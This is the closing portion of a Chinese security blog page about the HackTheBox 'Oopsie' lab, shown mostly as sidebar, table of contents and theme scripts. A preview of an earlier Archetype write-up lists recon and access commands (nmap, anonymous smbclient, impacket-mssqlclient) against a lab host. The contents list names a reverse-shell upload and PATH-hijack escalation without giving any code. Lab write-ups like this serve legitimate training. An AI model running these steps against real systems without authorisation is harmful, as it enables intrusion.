src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.webp" alt="支付宝"></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/98873ddf.html" title="[HTB] Archetype 渗透测试笔记"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/post/20250801-1.webp" onerror='onerror=null,src="/img/common/404.webp"' alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[HTB] Archetype 渗透测试笔记</div></div><div class="info-2"><div class="info-item-1">HackTheBox:Archetype 靶场的完整渗透流程一、端口扫描1nmap -sS -T4 -sV -Pn 10.129.75.207 445是smb(共享文件协议)端口，在未配置权限情况下可能允许匿名访问共享文件夹。二、SMB 信息收集尝试空密码进行SMB登陆1. -L表示列出共享资源2. -N表示不使用密码1smbclient -L -N //10.129.75.207/ 发现backups目录SMB连接并列出目录内容，下载有用文件123smbclient //10.129.75.207/backups -Nsmb: \&gt; lssmb: \&gt; get prod.dtsConfig 1cat prod.dtsConfig 发现账号密码 三、MSSQL 利用1.使用网络协议包impacket中的mssqlclient连接SQL server 服务器1impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.75.207 同时检查数据库权限 ⚠ 易错提示，点击查看 注意这里的 `/`...</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar/20250801-0.jpg" onerror='this.onerror=null,this.src="/img/common/404.webp"' alt="avatar"></div><div class="author-info-name">Nuyoah</div><div class="author-info-description">莫三天打鱼两天晒网</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/IsNuyoah"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/IsNuyoah" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="mailto:3287828082@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a><a class="social-icon" href="https://space.bilibili.com/457768833" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color:#fb7299"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">一个学习开发，网安，AI，编程的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackTheBox-Oopsie-%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">HackTheBox:Oopsie 靶场的完整渗透流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">一、端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">二、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B9%E6%8D%AE%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%EF%BC%8C%E8%AE%BF%E9%97%AE-HTTP-%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.根据端口扫描结果，访问 HTTP 服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">1.3.</span> <span class="toc-text">三、获取用户权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8-BurpSuite-%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%EF%BC%8C%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98id%E5%92%8Cusername"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.使用 BurpSuite 代理抓包，获得管理员id和username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BC%B9shell%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.上传反弹shell文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8curl%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 使用curl触发反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">四、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E5%8D%87%E4%B8%BAterminal-shell"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 提升为terminal shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8PATH%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. 使用PATH劫持提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">五、总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/1c2d3e4f.html" title="[HTB] Oopsie 渗透测试笔记"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/post/1754126926_IMG_4504.webp" onerror='this.onerror=null,this.src="/img/common/404.webp"' alt="[HTB] Oopsie 渗透测试笔记"></a><div class="content"><a class="title" href="/posts/1c2d3e4f.html" title="[HTB] Oopsie 渗透测试笔记">[HTB] Oopsie 渗透测试笔记</a><time datetime="2025-08-03T04:00:00.000Z" title="发表于 2025-08-03 12:00:00">2025-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/98873ddf.html" title="[HTB] Archetype 渗透测试笔记"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/post/20250801-1.webp" onerror='this.onerror=null,this.src="/img/common/404.webp"' alt="[HTB] Archetype 渗透测试笔记"></a><div class="content"><a class="title" href="/posts/98873ddf.html" title="[HTB] Archetype 渗透测试笔记">[HTB] Archetype 渗透测试笔记</a><time datetime="2025-08-01T10:30:00.000Z" title="发表于 2025-08-01 18:30:00">2025-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/8283a223.html" title="靶场文章标题">靶场文章标题</a><time datetime="2025-07-31T02:00:00.000Z" title="发表于 2025-07-31 10:00:00">2025-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/8283a223.html" title="靶场文章标题">靶场文章标题</a><time datetime="2025-07-31T02:00:00.000Z" title="发表于 2025-07-31 10:00:00">2025-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4aaaaa72.html" title="封面图测试文章"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.mtyqx.cn/api/random.php" onerror='this.onerror=null,this.src="/img/common/404.webp"' alt="封面图测试文章"></a><div class="content"><a class="title" href="/posts/4aaaaa72.html" title="封面图测试文章">封面图测试文章</a><time datetime="2025-07-09T07:30:00.000Z" title="发表于 2025-07-09 15:30:00">2025-07-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025.5.25 - 2025 By Nuyoah</div><div class="framework-info"><span>框架</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div><div class="footer_custom_text">别打了，再打就炸了</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-seven-iota-89.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo-seven-iota-89.vercel.app/',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/twikoo/1.4.18/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/title.js"></script><div class="aplayer no-destroy" data-id="6832096597" data-server="netease" data-type="playlist" data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true"></div><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script></div><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script async src="/js/ali_font.js"></script><div class="js-pjax"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__zoomIn"),arr[i].setAttribute("data-wow-duration","1.5s"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","30"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__zoomIn"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script><script async>for(var arr=document.getElementsByClassName("flink-list-card"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__flipInY"),arr[i].setAttribute("data-wow-duration","3s"),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script><script async>for(var arr=document.getElementsByClassName("flink-list-card"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__animated"),arr[i].setAttribute("data-wow-duration","3s"),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script><script async>for(var arr=document.getElementsByClassName("article-sort-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__slideInRight"),arr[i].setAttribute("data-wow-duration","1.5s"),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script><script async>for(var arr=document.getElementsByClassName("site-card"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__flipInY"),arr[i].setAttribute("data-wow-duration","3s"),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script><script async>for(var arr=document.getElementsByClassName("site-card"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__animated"),arr[i].setAttribute("data-wow-duration","3s"),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/koharu.model.json"},display:{position:"left",width:150,height:300},mobile:{show:!1},log:!1,pluginJsPath:"lib/",pluginModelPath:"assets/",pluginRootPath:"live2dw/"})</script></body></html>
